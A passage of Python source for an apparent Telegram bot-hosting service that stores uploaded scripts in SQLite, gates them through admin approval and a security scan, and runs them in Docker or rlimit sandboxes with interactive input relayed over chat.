    _disabled_scan_labels = set(_json_settings.loads(_disabled_raw))
except Exception:
    _disabled_scan_labels = set()

logger.info(f"Settings loaded: auto_approve={auto_approve_enabled}, daily_msg={daily_msg_enabled}, "
            f"hourly_backup={hourly_backup_enabled}, disabled_scan_rules={len(_disabled_scan_labels)}")

def save_user_file(user_id, file_name, file_type='py'):
    now = datetime.now().isoformat()
    for db_path in [DATABASE_PATH, BACKUP_DATABASE_PATH]:
        with DB_LOCK:
            conn = _get_conn(db_path)
            c = conn.cursor()
            try:
                c.execute(
                    'INSERT OR REPLACE INTO user_files (user_id, file_name, file_type, uploaded_at) VALUES (?,?,?,?)',
                    (user_id, file_name, file_type, now)
                )
                conn.commit()
            except Exception as e:
                logger.error(f"save_user_file ({db_path}): {e}")
            finally:
                conn.close()
    user_files.setdefault(user_id, [])
    user_files[user_id] = [f for f in user_files[user_id] if f[0] != file_name]
    user_files[user_id].append((file_name, file_type))

def remove_user_file_db(user_id, file_name):
    with DB_LOCK:
        conn = _get_conn(DATABASE_PATH)
        c = conn.cursor()
        try:
            c.execute('DELETE FROM user_files WHERE user_id=? AND file_name=?', (user_id, file_name))
            conn.commit()
        except Exception as e:
            logger.error(f"remove_user_file_db: {e}")
        finally:
            conn.close()
    if user_id in user_files:
        user_files[user_id] = [f for f in user_files[user_id] if f[0] != file_name]
        if not user_files[user_id]:
            del user_files[user_id]

def mark_script_running(user_id, file_name, file_type, chat_id):
    now = datetime.now().isoformat()
    for db_path in [DATABASE_PATH, BACKUP_DATABASE_PATH]:
        with DB_LOCK:
            conn = _get_conn(db_path)
            c = conn.cursor()
            try:
                c.execute(
                    'INSERT OR REPLACE INTO running_scripts (user_id, file_name, file_type, chat_id, started_at) VALUES (?,?,?,?,?)',
                    (user_id, file_name, file_type, chat_id, now)
                )
                conn.commit()
            except Exception as e:
                logger.error(f"mark_script_running ({db_path}): {e}")
            finally:
                conn.close()

def unmark_script_running(user_id, file_name):
    for db_path in [DATABASE_PATH, BACKUP_DATABASE_PATH]:
        with DB_LOCK:
            conn = _get_conn(db_path)
            c = conn.cursor()
            try:
                c.execute('DELETE FROM running_scripts WHERE user_id=? AND file_name=?', (user_id, file_name))
                conn.commit()
            except Exception as e:
                logger.error(f"unmark_script_running ({db_path}): {e}")
            finally:
                conn.close()

def get_all_running_scripts():
    try:
        conn = _get_conn(DATABASE_PATH)
        c = conn.cursor()
        c.execute('SELECT user_id, file_name, file_type, chat_id FROM running_scripts')
        rows = c.fetchall()
        conn.close()
        return rows
    except Exception as e:
        logger.error(f"get_all_running_scripts: {e}")
        return []

def add_active_user(user_id):
    active_users.add(user_id)
    now = datetime.now().isoformat()
    for db_path in [DATABASE_PATH, BACKUP_DATABASE_PATH]:
        with DB_LOCK:
            conn = _get_conn(db_path)
            c = conn.cursor()
            try:
                c.execute('INSERT OR IGNORE INTO active_users (user_id, first_seen) VALUES (?,?)', (user_id, now))
                conn.commit()
            except Exception:
                pass
            finally:
                conn.close()

def save_subscription(user_id, expiry):
    for db_path in [DATABASE_PATH, BACKUP_DATABASE_PATH]:
        with DB_LOCK:
            conn = _get_conn(db_path)
            c = conn.cursor()
            try:
                c.execute('INSERT OR REPLACE INTO subscriptions (user_id, expiry) VALUES (?,?)',
                          (user_id, expiry.isoformat()))
                conn.commit()
            except Exception:
                pass
            finally:
                conn.close()
    user_subscriptions[user_id] = {'expiry': expiry}

def remove_subscription_db(user_id):
    with DB_LOCK:
        conn = _get_conn(DATABASE_PATH)
        c = conn.cursor()
        try:
            c.execute('DELETE FROM subscriptions WHERE user_id=?', (user_id,))
            conn.commit()
        except Exception:
            pass
        finally:
            conn.close()
    user_subscriptions.pop(user_id, None)

def add_admin_db(aid):
    for db_path in [DATABASE_PATH, BACKUP_DATABASE_PATH]:
        with DB_LOCK:
            conn = _get_conn(db_path)
            c = conn.cursor()
            try:
                c.execute('INSERT OR IGNORE INTO admins (user_id) VALUES (?)', (aid,))
                conn.commit()
            except Exception:
                pass
            finally:
                conn.close()
    admin_ids.add(aid)

def remove_admin_db(aid):
    if aid == OWNER_ID:
        return False
    with DB_LOCK:
        conn = _get_conn(DATABASE_PATH)
        c = conn.cursor()
        try:
            c.execute('DELETE FROM admins WHERE user_id=?', (aid,))
            conn.commit()
            success = c.rowcount > 0
        except Exception as e:
            logger.error(f"remove_admin_db: {e}")
            success = False
        finally:
            conn.close()
    # Fix #4: discard from in-memory set AFTER DB succeeds, outside try block
    if success:
        admin_ids.discard(aid)
    return success

def save_file_approval(user_id, file_name, file_type, status=FILE_STATUS_APPROVED,
                       reviewed_by=None, message_id=None):
    uploaded_time = datetime.now().isoformat()
    review_time   = datetime.now().isoformat() if reviewed_by else None
    for db_path in [DATABASE_PATH, BACKUP_DATABASE_PATH]:
        with DB_LOCK:
            conn = _get_conn(db_path)
            c = conn.cursor()
            try:
                c.execute('''INSERT OR REPLACE INTO file_approvals
                            (user_id, file_name, file_type, status, reviewed_by,
                             review_time, uploaded_time, message_id)
                            VALUES (?,?,?,?,?,?,?,?)''',
                          (user_id, file_name, file_type, status, reviewed_by,
                           review_time, uploaded_time, message_id))
                conn.commit()
            except Exception as e:
                logger.error(f"save_file_approval ({db_path}): {e}")
            finally:
                conn.close()

def get_file_status(user_id, file_name):
    with DB_LOCK:
        conn = _get_conn(DATABASE_PATH)
        c = conn.cursor()
        try:
            c.execute('''SELECT status, reviewed_by, review_time, file_type, ban_reason
                         FROM file_approvals WHERE user_id=? AND file_name=?''',
                      (user_id, file_name))
            row = c.fetchone()
            if row:
                return {
                    'status': row[0], 'reviewed_by': row[1],
                    'review_time': row[2], 'file_type': row[3],
                    'ban_reason': row[4]
                }
            # SECURITY FIX: Fail-closed. Unknown file → PENDING, not APPROVED.
            # Old code defaulted to APPROVED, turning a missing DB row into a free pass.
            return {'status': FILE_STATUS_PENDING, 'file_type': 'unknown', 'ban_reason': None}
        except Exception as e:
            logger.error(f"get_file_status: {e}")
            # SECURITY FIX: DB errors also fail-closed (PENDING).
            return {'status': FILE_STATUS_PENDING, 'file_type': 'unknown', 'ban_reason': None}
        finally:
            conn.close()

def update_file_status(user_id, file_name, status, admin_id, ban_reason=None):
    with DB_LOCK:
        conn = _get_conn(DATABASE_PATH)
        c = conn.cursor()
        try:
            review_time = datetime.now().isoformat()
            c.execute('''UPDATE file_approvals
                         SET status=?, reviewed_by=?, review_time=?, ban_reason=?
                         WHERE user_id=? AND file_name=?''',
                      (status, admin_id, review_time, ban_reason, user_id, file_name))
            conn.commit()
            return c.rowcount > 0
        except Exception as e:
            logger.error(f"update_file_status: {e}")
            return False
        finally:
            conn.close()

def get_all_approved_files():
    with DB_LOCK:
        conn = _get_conn(DATABASE_PATH)
        c = conn.cursor()
        try:
            c.execute('''SELECT user_id, file_name, file_type, uploaded_time
                         FROM file_approvals WHERE status=?
                         ORDER BY uploaded_time DESC''', (FILE_STATUS_APPROVED,))
            return c.fetchall()
        except Exception as e:
            logger.error(f"get_all_approved_files: {e}")
            return []
        finally:
            conn.close()

def get_all_pending_files():
    with DB_LOCK:
        conn = _get_conn(DATABASE_PATH)
        c = conn.cursor()
        try:
            c.execute('''SELECT user_id, file_name, file_type, uploaded_time
                         FROM file_approvals WHERE status=?
                         ORDER BY uploaded_time DESC''', (FILE_STATUS_PENDING,))
            return c.fetchall()
        except Exception as e:
            logger.error(f"get_all_pending_files: {e}")
            return []
        finally:
            conn.close()

def get_pending_files_count():
    with DB_LOCK:
        conn = _get_conn(DATABASE_PATH)
        c = conn.cursor()
        try:
            c.execute('SELECT COUNT(*) FROM file_approvals WHERE status=?', (FILE_STATUS_PENDING,))
            return c.fetchone()[0]
        except Exception:
            return 0
        finally:
            conn.close()

def get_backup_files(user_id=None):
    with DB_LOCK:
        conn = _get_conn(BACKUP_DATABASE_PATH)
        c = conn.cursor()
        try:
            if user_id:
                c.execute('SELECT user_id, file_name, file_type, uploaded_at FROM user_files WHERE user_id=?', (user_id,))
            else:
                c.execute('SELECT user_id, file_name, file_type, uploaded_at FROM user_files')
            return c.fetchall()
        except Exception as e:
            logger.error(f"get_backup_files: {e}")
            return []
        finally:
            conn.close()

def ban_file(user_id, file_name, admin_id, reason="Banned by admin"):
    update_file_status(user_id, file_name, FILE_STATUS_BANNED, admin_id, ban_reason=reason)
    script_key = f"{user_id}_{file_name}"
    if is_bot_running(user_id, file_name):
        pi = bot_scripts.get(script_key)
        if pi:
            kill_process_tree(pi)
        bot_scripts.pop(script_key, None)
    unmark_script_running(user_id, file_name)
    try:
        bot.send_message(
            user_id,
            f"🚫 <b>File Banned</b>\n\n"
            f"📄 <code>{file_name}</code>\n"
            f"📋 Reason: <i>{reason}</i>\n\n"
            f"Contact admin if you think this is a mistake.",
            parse_mode='HTML'
        )
    except Exception:
        pass

def is_bot_running(script_owner_id, file_name):
    script_key  = f"{script_owner_id}_{file_name}"
    script_info = bot_scripts.get(script_key)
    if not script_info or not script_info.get('process'):
        return False
    try:
        proc    = psutil.Process(script_info['process'].pid)
        running = proc.is_running() and proc.status() != psutil.STATUS_ZOMBIE
        if not running:
            _close_log(script_info)
            bot_scripts.pop(script_key, None)
        return running
    except psutil.NoSuchProcess:
        _close_log(script_info)
        bot_scripts.pop(script_key, None)
        return False
    except Exception:
        return False

def _close_log(script_info):
    lf = script_info.get('log_file')
    if lf and not lf.closed:
        try:
            lf.close()
        except Exception:
            pass

def _close_pty(script_info):
    fd = script_info.get('master_fd')
    if fd is not None:
        try:
            os.close(fd)
        except OSError:
            pass

def _interactive_runner(cmd_list, script_owner_id, user_folder, file_name, message_obj, script_key, file_type):
    # ── SECURITY: Verify script path is inside the user's sandbox ──────────
    script_path = cmd_list[-1] if cmd_list else ''
    if script_path and not _path_in_sandbox(script_path, user_folder):
        _safe_reply(message_obj, f"❌ Security: script path outside sandbox. Rejected.")
        logger.warning(f"SANDBOX VIOLATION: {script_owner_id} tried to run {script_path}")
        return

    log_path = os.path.join(user_folder, f"{os.path.splitext(file_name)[0]}.log")
    try:
        log_file = open(log_path, 'w', encoding='utf-8', errors='ignore')
    except Exception as e:
        _safe_reply(message_obj, f"❌ Cannot open log file: {_esc(str(e))}")
        return

    try:
        master_fd, slave_fd = pty.openpty()
        # ── SECURITY: Run inside the user's persistent Docker sandbox
        # container when available (kernel-enforced cgroup limits + no
        # visibility into the host or other users' data). Falls back to the
        # existing rlimit-based sandbox if Docker isn't usable on this host.
        argv, used_docker = _sandboxed_popen_argv(script_owner_id, user_folder, cmd_list, tty=True)
        if used_docker:
            process = subprocess.Popen(
                argv,
                stdin=slave_fd, stdout=slave_fd, stderr=slave_fd,
                close_fds=True,
            )
        else:
            process = subprocess.Popen(
                argv, cwd=user_folder,
                stdin=slave_fd, stdout=slave_fd, stderr=slave_fd,
                close_fds=True,
                env=_build_sandbox_env(user_folder),
                preexec_fn=_make_sandbox_preexec(user_folder)
            )
        os.close(slave_fd)
    except Exception as e:
        log_file.close()
        _safe_reply(message_obj, f"❌ Error starting <code>{file_name}</code>: {_esc(str(e))}", parse_mode='HTML')
        return

    bot_scripts[script_key] = {
        'process': process, 'log_file': log_file, 'file_name': file_name,
        'chat_id': message_obj.chat.id, 'script_owner_id': script_owner_id,
        'start_time': datetime.now(), 'user_folder': user_folder,
        'type': file_type, 'script_key': script_key,
        'master_fd': master_fd,
        # When run via Docker, 'process' is the local `docker exec` client —
        # killing it does NOT stop the process inside the container. Record
        # what we need to reach in and stop it for real (see kill_process_tree).
        'sandboxed': used_docker,
        'container_cmd': _translate_cmd_for_container(user_folder, cmd_list) if used_docker else None,
    }
    mark_script_running(script_owner_id, file_name, file_type, message_obj.chat.id)
    _safe_reply(
        message_obj,
        f"🟢 <code>{file_name}</code> is running  <b>(PID {process.pid})</b>\n\n"
        f"💡 If it asks for input, I'll prompt you here automatically.",
        parse_mode='HTML'
    )

    buf         = b""
    last_flush  = time.time()
    PROMPT_IDLE = 0.6

    while True:
        if process.poll() is not None:
            break
        try:
            r, _, _ = select.select([master_fd], [], [], 0.3)
        except (OSError, ValueError):
            break

        if r:
            try:
                chunk = os.read(master_fd, 4096)
            except OSError:
                break
            if not chunk:
                break
            buf += chunk
            try:
                log_file.write(chunk.decode('utf-8', errors='ignore'))
                log_file.flush()
            except Exception:
                pass
            last_flush = time.time()
        else:
            if buf and (time.time() - last_flush) >= PROMPT_IDLE:
                ends_with_newline = buf.endswith((b"\n", b"\r"))
                text = buf.decode('utf-8', errors='ignore').strip()
                buf  = b""
                if text and not ends_with_newline and not _LOG_NOISE_RE.search(text):
                    waiting_for_input[script_key] = {
                        'chat_id':    message_obj.chat.id,
                        'master_fd':  master_fd,
                        'process':    process,
                        'file_name':  file_name,
                    }
                    try:
                        prompt = bot.send_message(
                            message_obj.chat.id,
                            f"⌨️ <b>{_esc(file_name)}</b> is waiting for input:\n\n"
                            f"<pre>{_esc(text[-1000:])}</pre>\n\n"
                            f"✍️ Reply below with your input:",
                            parse_mode='HTML'
                        )
                        bot.register_next_step_handler(
                            prompt, _handle_script_input, script_key=script_key
                        )
                    except Exception as e:
                        logger.error(f"input prompt send: {e}")

    if buf:
        try:
            log_file.write(buf.decode('utf-8', errors='ignore'))
        except Exception:
            pass

    rc = process.returncode
    waiting_for_input.pop(script_key, None)
    _close_pty(bot_scripts.get(script_key, {}))
    try:
        log_file.close()
    except Exception:
        pass
    bot_scripts.pop(script_key, None)

    # Only unmark from DB if script exited cleanly (rc=0).
    # For non-zero exits, leave the DB mark so the crash watchdog can auto-restart.
    if rc == 0:
        unmark_script_running(script_owner_id, file_name)
        exit_msg = (
            f"✅ <code>{_esc(file_name)}</code> finished and exited (code 0).\n"
            f"<i>If this was supposed to keep running, check your script for early exit conditions.</i>"
        )
    else:
        # Leave mark_script_running so watchdog picks it up for auto-restart
        exit_msg = (
            f"⚠️ <code>{_esc(file_name)}</code> exited unexpectedly (code <b>{rc}</b>).\n"
            f"♻️ <i>Watchdog will auto-restart it shortly…</i>"
        )

    try:
        bot.send_message(
            message_obj.chat.id,
            exit_msg,
            parse_mode='HTML'
        )
    except Exception:
        pass


def _handle_script_input(message, script_key=None):
    # ── SECURITY: Verify the sender owns the script receiving the input ───
    if script_key:
        try:
            key_owner_id = int(script_key.split('_')[0])
            if message.from_user.id != key_owner_id:
                logger.warning(
                    f"INPUT HIJACK ATTEMPT: user {message.from_user.id} tried "
                    f"to send input to script owned by {key_owner_id}"
                )
                bot.reply_to(message, "⚠️ You don't own this script session.")
                return
        except (ValueError, IndexError):
            bot.reply_to(message, "⚠️ Invalid script session.")
            return

    info = waiting_for_input.get(script_key)
    if not info:
        bot.reply_to(message, "⚠️ That script is no longer waiting for input.")
        return
    text = (message.text or "")
    try:
        os.write(info['master_fd'], (text + "\n").encode('utf-8'))
        bot.reply_to(message, f"✅ Sent: <code>{_esc(text)}</code>", parse_mode='HTML')
    except OSError as e:
        bot.reply_to(message, f"❌ Failed to send input: {_esc(str(e))}")
    waiting_for_input.pop(script_key, None)


def kill_process_tree(process_info):
    _close_log(process_info)
    _close_pty(process_info)

    if process_info.get('sandboxed') and process_info.get('container_cmd'):
        # The tracked 'process' is only the local `docker exec` client —
        # SIGKILL'ing it leaves the real process running inside the
        # container. Reach in and stop it directly first.
        try:
            script_owner_id = process_info.get('script_owner_id')
            container_cmd = process_info.get('container_cmd')
            match_str = ' '.join(container_cmd)
            docker_sandbox.run_sync(
                script_owner_id, process_info.get('user_folder'),
                ['pkill', '-f', match_str],
                timeout=10, capture_output=True, text=True
            )
        except Exception as e:
            logger.error(f"kill_process_tree docker pkill: {e}")

    process = process_info.get('process')
    if not process or not hasattr(process, 'pid'):
        return
    try:
        parent   = psutil.Process(process.pid)
        children = parent.children(recursive=True)
        for child in children:
            try:
                child.terminate()
            except (psutil.NoSuchProcess, Exception):
                pass
        gone, alive = psutil.wait_procs(children, timeout=2)
        for p in alive:
            try:
                p.kill()
            except Exception:
                pass
        try:
            parent.terminate()
            try:
                parent.wait(timeout=2)
            except psutil.TimeoutExpired:
                parent.kill()
        except psutil.NoSuchProcess:
            pass
    except psutil.NoSuchProcess:
        pass
    except Exception as e:
        logger.error(f"kill_process_tree: {e}")

KNOWN_MODULES = {
    'telebot': 'pyTelegramBotAPI', 'telegram': 'python-telegram-bot',
    'aiogram': 'aiogram', 'pyrogram': 'pyrogram', 'telethon': 'telethon',
    'bs4': 'beautifulsoup4', 'requests': 'requests', 'PIL': 'Pillow',
    'cv2': 'opencv-python', 'yaml': 'PyYAML', 'dotenv': 'python-dotenv',
    'dateutil': 'python-dateutil', 'pandas': 'pandas', 'numpy': 'numpy',
    'flask': 'Flask', 'django': 'Django', 'sqlalchemy': 'SQLAlchemy',
    'psutil': 'psutil', 'schedule': 'schedule', 'pydantic': 'pydantic',
    'httpx': 'httpx', 'aiohttp': 'aiohttp',
    'asyncio': None, 'json': None, 'datetime': None, 'os': None, 'sys': None,
    're': None, 'time': None, 'math': None, 'random': None, 'logging': None,
    'threading': None, 'subprocess': None, 'zipfile': None, 'tempfile': None,
    'shutil': None, 'sqlite3': None, 'atexit': None,
}

_SAFE_PKG_RE = re.compile(r'^[A-Za-z0-9_.\-]+$')

def _sanitize_package_name(raw):
    raw = raw.strip()
    base = re.split(r'[><=!]', raw)[0].strip()
    if not base:
        return None
    if not _SAFE_PKG_RE.match(base):
        return None
    if len(base) < 1 or len(base) > 120:
        return None
    return base

def _safe_reply(message_obj, text, **kwargs):
    if getattr(message_obj, 'message_id', None):
        return bot.reply_to(message_obj, text, **kwargs)
    return bot.send_message(message_obj.chat.id, text, **kwargs)

def attempt_install_pip(module_name, message, user_id=None):
    package_name = KNOWN_MODULES.get(module_name.lower(), module_name)
    if package_name is None:
        return False
    pip_cmd = get_user_pip(user_id) if user_id else [sys.executable, '-m', 'pip']
    try:
        _safe_reply(message, f"📦 Installing <code>{package_name}</code>…", parse_mode='HTML')
        if user_id:
            argv, used_docker = _sandboxed_popen_argv(user_id, get_user_folder(user_id), pip_cmd + ['install', package_name])
        else:
            argv, used_docker = pip_cmd + ['install', package_name], False
        result = subprocess.run(
            argv,
            capture_output=True, text=True, encoding='utf-8', errors='ignore'
        )
        if result.returncode == 0:
            _safe_reply(message, f"✅ <code>{package_name}</code> installed.", parse_mode='HTML')
            return True
        else:
            _safe_reply(message,
                f"❌ Failed to install <code>{package_name}</code>\n<pre>{_html.escape((result.stderr or result.stdout)[:1500])}</pre>",
                parse_mode='HTML')
            return False
    except Exception as e:
        _safe_reply(message, f"Install error: {_esc(str(e))}")
        return False

def attempt_install_npm(module_name, user_folder, message, user_id=None):
    try:
        _safe_reply(message, f"📦 Installing npm <code>{module_name}</code>…", parse_mode='HTML')
        if user_id and docker_sandbox.ensure_user_container(user_id, user_folder):
            argv = docker_sandbox.exec_argv(user_id, ['npm', 'install', module_name])
            result = subprocess.run(argv, capture_output=True, text=True, encoding='utf-8', errors='ignore')
        else:
            result = subprocess.run(
                ['npm', 'install', module_name],
                capture_output=True, text=True, cwd=user_folder,
                encoding='utf-8', errors='ignore'
            )
        if result.returncode == 0:
            _safe_reply(message, f"✅ <code>{module_name}</code> installed.", parse_mode='HTML')
            return True
        else:
            _safe_reply(message,
                f"❌ Failed\n<pre>{(result.stderr or result.stdout)[:1500]}</pre>",
                parse_mode='HTML')
            return False
    except FileNotFoundError:
        _safe_reply(message, "❌ <code>npm</code> not found. Install Node.js first.", parse_mode='HTML')
        return False
    except Exception as e:
        _safe_reply(message, f"npm error: {e}")
        return False

def _check_approved(script_owner_id, file_name, message_obj):
    fs = get_file_status(script_owner_id, file_name)
    if fs['status'] == FILE_STATUS_APPROVED:
        return True
    msgs = {
        FILE_STATUS_PENDING:  "⏳ Your file is still pending.",
        FILE_STATUS_REJECTED: "❌ Your file was rejected by admin.",
        FILE_STATUS_BANNED:   f"🚫 File is banned.\nReason: {fs.get('ban_reason', 'N/A')}",
    }
    _safe_reply(message_obj,
        f"Cannot run <code>{file_name}</code>.\n{msgs.get(fs['status'], 'Unknown status.')}",
        parse_mode='HTML')
    return False

def run_script(script_path, script_owner_id, user_folder, file_name, message_obj, attempt=1):
    if not _check_approved(script_owner_id, file_name, message_obj):
        return
    if attempt > 2:
        _safe_reply(message_obj, f"❌ Failed to start <code>{file_name}</code> after 2 attempts.", parse_mode='HTML')
        return

    script_key = f"{script_owner_id}_{file_name}"
    user_python = get_user_python(script_owner_id)

    if not os.path.exists(script_path):
        _safe_reply(message_obj, f"❌ <code>{file_name}</code> not found. Please re-upload.", parse_mode='HTML')
        remove_user_file_db(script_owner_id, file_name)
        return

    if attempt == 1:
        check_proc = None
        try:
            argv, used_docker = _sandboxed_popen_argv(script_owner_id, user_folder, [user_python, script_path])
            check_proc = subprocess.Popen(
                argv, cwd=None if used_docker else user_folder,
                stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                text=True, encoding='utf-8', errors='ignore',
                env=None if used_docker else _build_sandbox_env(user_folder)
            )
            _, stderr = check_proc.communicate(timeout=5)
            if check_proc.returncode != 0 and stderr:
                match = re.search(r"ModuleNotFoundError: No module named '(.+?)'", stderr)
                if match:
                    mod = match.group(1).strip().strip("'\"")
                    if attempt_install_pip(mod, message_obj, user_id=script_owner_id):
                        _safe_reply(message_obj, f"🔄 Retrying <code>{file_name}</code>…", parse_mode='HTML')
                        time.sleep(2)
                        threading.Thread(
                            target=run_script,
                            args=(script_path, script_owner_id, user_folder, file_name, message_obj, 2)
                        ).start()
                    else:
                        _safe_reply(message_obj, f"❌ Install failed. Cannot run <code>{file_name}</code>.", parse_mode='HTML')
                    return
                else:
                    _safe_reply(message_obj,
                        f"⚠️ Pre-run error:\n<pre>{_html.escape(stderr[:600])}</pre>", parse_mode='HTML')
                    return
        except subprocess.TimeoutExpired:
            pass
        except FileNotFoundError:
            _safe_reply(message_obj, "❌ Python interpreter not found.")
            return
        except Exception as e:
            _safe_reply(message_obj, f"Pre-check error: {_esc(str(e))}")
            return
        finally:
            if check_proc and check_proc.poll() is None:
                check_proc.kill()
                check_proc.communicate()

    threading.Thread(
        target=_interactive_runner,
        args=([user_python, script_path], script_owner_id, user_folder, file_name, message_obj, script_key, 'py'),
        daemon=True
    ).start()

def run_js_script(script_path, script_owner_id, user_folder, file_name, message_obj, attempt=1):
    if not _check_approved(script_owner_id, file_name, message_obj):
        return
    if attempt > 2:
        _safe_reply(message_obj, f"❌ Failed to start <code>{file_name}</code> after 2 attempts.", parse_mode='HTML')
        return

    script_key = f"{script_owner_id}_{file_name}"

    if not os.path.exists(script_path):
        _safe_reply(message_obj, f"❌ <code>{file_name}</code> not found. Please re-upload.", parse_mode='HTML')
        remove_user_file_db(script_owner_id, file_name)
        return

    if attempt == 1:
        check_proc = None
        try:
            argv, used_docker = _sandboxed_popen_argv(script_owner_id, user_folder, ['node', script_path])
            check_proc = subprocess.Popen(
                argv, cwd=None if used_docker else user_folder,
                stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                text=True, encoding='utf-8', errors='ignore',
                env=None if used_docker else _build_sandbox_env(user_folder)
            )
            _, stderr = check_proc.communicate(timeout=5)
            if check_proc.returncode != 0 and stderr:
                match = re.search(r"Cannot find module '(.+?)'", stderr)
                if match:
                    mod = match.group(1).strip().strip("'\"")
                    if not mod.startswith(('.', '/')):
                        if attempt_install_npm(mod, user_folder, message_obj, user_id=script_owner_id):
                            _safe_reply(message_obj, f"🔄 Retrying <code>{file_name}</code>…", parse_mode='HTML')
                            time.sleep(2)
                            threading.Thread(
                                target=run_js_script,
                                args=(script_path, script_owner_id, user_folder, file_name, message_obj, 2)
                            ).start()
                        else:
                            _safe_reply(message_obj, "❌ NPM install failed.")
                        return
                _safe_reply(message_obj,
                    f"⚠️ Pre-run error:\n<pre>{stderr[:600]}</pre>", parse_mode='HTML')
                return
        except subprocess.TimeoutExpired:
            pass
        except FileNotFoundError:
            _safe_reply(message_obj, "❌ <code>node</code> not found. Install Node.js.", parse_mode='HTML')
            return
        except Exception as e:
            _safe_reply(message_obj, f"JS pre-check error: {e}")
            return
        finally:
            if check_proc and check_proc.poll() is None:
                check_proc.kill()
                check_proc.communicate()

    threading.Thread(
        target=_interactive_runner,
        args=(['node', script_path], script_owner_id, user_folder, file_name, message_obj, script_key, 'js'),
        daemon=True
    ).start()

def send_file_for_admin_verification(message, user_id, file_name, file_type,
                                     diff_snippet: str = None):
    user      = message.from_user
    uname     = f"@{user.username}" if user.username else "no username"
    file_size = ""
    try:
        fp = os.path.join(get_user_folder(user_id), file_name)
        file_size = f"{os.path.getsize(fp) / 1024:.1f} KB"
    except Exception:
        pass

    is_reupload = diff_snippet is not None
    header = "♻️ <b>File Re-Uploaded</b> — Diff Below" if is_reupload else "🔔 <b>New File Auto-Approved</b> — Verify &amp; Ban if needed"
    text = (
        f"{header}\n\n"
        f"┌────────────────────\n"
        f"│ 👤 {user.first_name}  {uname}\n"
        f"│ 🆔 <code>{user_id}</code>\n"
        f"│ 📄 <code>{file_name}</code>\n"
        f"│ 🏷️ Type: <code>{file_type.upper()}</code>\n"
        f"│ 📦 Size: {file_size}\n"
        f"│ 🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        f"└─────────────────────\n\n"
        f"✅ File is <b>already running</b>. Review and ban if malicious:"
    )
    if is_reupload and diff_snippet:
        diff_preview = diff_snippet[:800]
        text += f"\n\n📝 <b>Changes vs previous version:</b>\n<pre>{_esc(diff_preview)}</pre>"

    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("✅ Keep (OK)",  callback_data=_cb('keep_',   user_id, file_name)),
        types.InlineKeyboardButton("🔨 Ban File",   callback_data=_cb('ban_',    user_id, file_name)),
    )
    markup.add(types.InlineKeyboardButton("📋 View All Approved", callback_data='view_approved'))

    for aid in admin_ids:
        try:
            bot.forward_message(aid, message.chat.id, message.message_id)
            sent = bot.send_message(aid, text, reply_markup=markup, parse_mode='HTML')
            save_file_approval(user_id, file_name, file_type,
                               FILE_STATUS_APPROVED, None, sent.message_id)
        except Exception as e:
            logger.error(f"send_file_for_admin_verification to {aid}: {e}")

def handle_single_file(file_path, user_id, user_folder, file_name, file_type, message,
                       old_content: str = None):
    save_user_file(user_id, file_name, file_type)

    # ── Security scan (always runs, regardless of auto-approve) ──────────
    scan_result = None
    if file_type in ('py', 'js'):
        code = _read_script_content(file_path)
        if code:
            scan_result = scan_script_for_threats(code, file_name)

    # Critical threats → block the file but keep it for admin override
    if scan_result and scan_result['blocked']:
        threat_lines = "\n".join(f"  • {_esc(t)}" for t in scan_result['threats'])
        ban_reason   = "Auto-scan: " + " | ".join(scan_result['threats'])[:400]

        # Mark banned in DB (file stays on disk so admin can override)
        save_file_approval(user_id, file_name, file_type,
                           FILE_STATUS_BANNED, None, None)
        # Also persist ban_reason
        update_file_status(user_id, file_name, FILE_STATUS_BANNED, 0, ban_reason=ban_reason)

        bot.reply_to(
            message,
            f"🚨 <b>File Blocked — Security Threat Detected</b>\n\n"
            f"📄 <code>{_esc(file_name)}</code> was <b>automatically blocked</b> by the scanner.\n\n"
            f"<b>Threats found:</b>\n{threat_lines}\n\n"
            f"⚠️ If this is a false positive, an admin can override the block.\n"
            f"Contact admin and reference your file name.",
            parse_mode='HTML'
        )

        # Alert all admins with an Override button
        admin_alert = (
            f"🚨 <b>SCAN BLOCKED FILE — Admin Override Available</b>\n\n"
            f"👤 User: <code>{user_id}</code>\n"
            f"📄 File: <code>{_esc(file_name)}</code>\n"
            f"🏷️ Type: <code>{file_type.upper()}</code>\n\n"
            f"<b>Threats detected:</b>\n{threat_lines}\n\n"
            f"⚠️ File is <b>kept on disk</b>. Override only if you trust this file."
        )
        mk_alert = types.InlineKeyboardMarkup(row_width=2)
        mk_alert.add(
            _btn("✅ Override & Approve", "success",
                 _cb('scanoverride_', user_id, file_name)),
            _btn("🗑️ Delete & Ban",      "danger",
                 _cb('scandelete_',   user_id, file_name)),
        )
        mk_alert.add(_btn("🔨 Ban User", "danger", f"ban_user_{user_id}"))
        for aid in admin_ids:
            try:
                bot.forward_message(aid, message.chat.id, message.message_id)
                bot.send_message(aid, admin_alert, reply_markup=mk_alert, parse_mode='HTML')
            except Exception:
                pass
        return

    # Build scan note for admin notification
    scan_note = ""
    if scan_result:
        if scan_result['clean']:
            scan_note = "\n✅ <b>Scan:</b> Clean"
        elif scan_result['warnings']:
            warn_lines = ", ".join(_esc(w) for w in scan_result['warnings'])
            scan_note  = f"\n⚠️ <b>Scan warnings:</b> {warn_lines}"

    # Upgrade 6: compute diff if this is a re-upload
    diff_snippet = None
    if old_content is not None:
        new_code = _read_script_content(file_path) or ""
        diff_snippet = _compute_diff(old_content, new_code, file_name)

    if auto_approve_enabled:
        save_file_approval(user_id, file_name, file_type, FILE_STATUS_APPROVED)
        reupload_note = "\n♻️ <i>This replaces a previous version — admin was sent a diff.</i>" if old_content is not None else ""
        bot.reply_to(
            message,
            f"✅ <b>File Auto-Approved!</b>\n\n"
            f"📄 <code>{_esc(file_name)}</code> has been <b>auto-approved</b>.{scan_note}{reupload_note}\n"
            f"Go to <b>📂 My Files</b> to start it now!\n\n"
            f"<i>⌨️ If your script needs input, I'll ask you automatically!</i>",
            parse_mode='HTML'
        )
        send_file_for_admin_verification(message, user_id, file_name, file_type,
                                         diff_snippet=diff_snippet)
    else:
        save_file_approval(user_id, file_name, file_type, FILE_STATUS_PENDING)
        bot.reply_to(
            message,
            f"⏳ <b>File Submitted for Review</b>\n\n"
            f"📄 <code>{_esc(file_name)}</code> is <b>pending admin approval</b>.{scan_note}\n"
            f"You'll be notified once it's reviewed.\n\n"
            f"<i>Auto-approval is currently OFF (set by admin).</i>",
            parse_mode='HTML'
        )
        send_file_for_admin_verification(message, user_id, file_name, file_type,
